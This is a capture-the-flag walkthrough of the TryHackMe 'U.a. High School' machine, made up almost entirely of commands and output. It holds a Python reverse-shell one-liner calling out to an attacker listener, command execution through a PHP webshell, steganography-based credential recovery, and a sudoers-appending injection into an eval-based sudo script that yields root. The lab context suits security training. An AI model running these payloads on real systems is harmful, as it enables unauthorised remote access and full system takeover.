---
title: U.a. High School
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the U.a. High
  School machine on TryHackMe.
slug: ua-high-school
---




```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6b:2b:5f:ff:7a:f1:2f:a8:55:9c:2e:7a:e3:ea:85:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukdbgritDMLyne1i15XokvddLT+005IDmdVYO+A3EzytaKgL3rT5qfMxjbee6tqIPDkKEYL39Z9gOkjvjoDkepGnjxn0LndfxVrypphtmKROfj06X0hXg1LNL/MvZjiTTlBck+perSlDHQqj+jdy1uuccCUScjJLGH++4Ux3j30WwVU7ebZXBVh0p/hPvoqERa0m3pkzIsf3Sr6Vtrsz2Gx1ctsO2U7fJBAvrZ09rd4xDznWYD0CL5GQJ6+f7+cD0DmWB5NDPi3kgdk9+OELRU5u6wFMjeeFZOaFTCsRbrQ1cVBIj6DZtDJPbZIz/yRQ86UP5JV2OX5DJE93dPt9tGAOwhgs/W+Kv3SuQ5H3560tng/NNtbQ6eyzJAs2gajlWNK4yfkMn/wS+g1rtBtPkAq970cmf8jJar59ZtxEBPTf6PPRpPQZm2yniJflzGore1zZAIxiOMrehf2ZNgwAhAQgE/Nv27dDexNs8tR8mZZHNup0m+5nX4/Eo0QZJmIk=
|   256 a3:b2:80:c2:92:ac:22:c6:ce:1e:24:c3:b8:56:89:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlkCF+OQL2wkk4UHcFcx2fhCXo8pgQFgAFXiSrS5B4s6drtRm3HSWg4nBKboSgh2E/81ZVFeTcelzM32l9f7Xk=
|   256 76:8c:11:d3:8c:16:82:48:e1:0c:99:21:74:02:0f:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPaxRqAP7FML6u8K/AnB6HZXd8lkjwdgyhp4idcxUEQi
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
 curl http://highschool.thm  
 
 href="assets/styles.css">

curl -X POST http://highschool.thm/assets/index.php?cmd=whoami
d3d3LWRhdGEK                                                                                                                                                  
```

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.153.193",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

```

> Using this rev shell i use to get reverse shell

```
listening on [any] 4444 ...
connect to [192.168.153.193] from (UNKNOWN) [10.65.131.251] 56926
www-data@ip-10-65-131-251:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==

```

```
echo QWxsbWlnaHRGb3JFdmVyISEhCg== | base64 -d                                             
AllmightForEver!!!  
```

```
steghide extract -sf oneforall.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```


> the `steghide` does not support `PNG` files, and the file already has the `JPG` extension. We can try changing the `PNG` magic bytes (`89 50 4E 47 0D 0A 1A 0A`) to `JPG` magic bytes (`FF D8 FF E0 00 10 4A 46 49 46 00 01`).

```
 hexeditor -b oneforall.jpg 
 
```

```
 steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".

```

```
cat creds.txt                                                 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A

```

> Now have `SSH CREDENTILAS`

```
cat user.txt
```

```
deku@ip-10-65-131-251:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on ip-10-65-131-251:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-65-131-251:
    (ALL) /opt/NewComponent/feedback.sh
deku@ip-10-65-131-251:~$ cd /opt/NewComponent
deku@ip-10-65-131-251:/opt/NewComponent$ ls
feedback.sh
deku@ip-10-65-131-251:/opt/NewComponent$ cat feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi


```

```
sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
"deku   ALL=ALL" >> /etc/sudoers
It is This:
Feedback successfully saved.
deku@ip-10-67-174-28:~$ sudo -l
Matching Defaults entries for deku on ip-10-67-174-28:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-67-174-28:
    (ALL) /opt/NewComponent/feedback.sh
    (root) ALL
deku@ip-10-67-174-28:~$ sudo su
root@ip-10-67-174-28:/home/deku# cd ~
root@ip-10-67-174-28:~# cd /root && cat root/root.txt
cat: root/root.txt: No such file or directory
root@ip-10-67-174-28:~# cd /root && cat root.txt

```